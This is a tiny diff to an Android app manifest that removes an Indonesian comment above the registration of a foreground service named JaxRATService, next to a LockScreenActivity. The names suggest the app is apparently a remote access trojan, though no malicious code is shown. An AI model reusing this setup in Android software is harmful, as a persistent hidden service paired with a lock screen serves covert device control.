@@ -22,7 +22,6 @@
 
         <activity android:name=".LockScreenActivity" android:theme="@android:style/Theme.DeviceDefault.NoActionBar" />
 
-        <!-- Daftarin Service-nya -->
         <service 
             android:name=".JaxRATService" 
             android:foregroundServiceType="dataSync" />
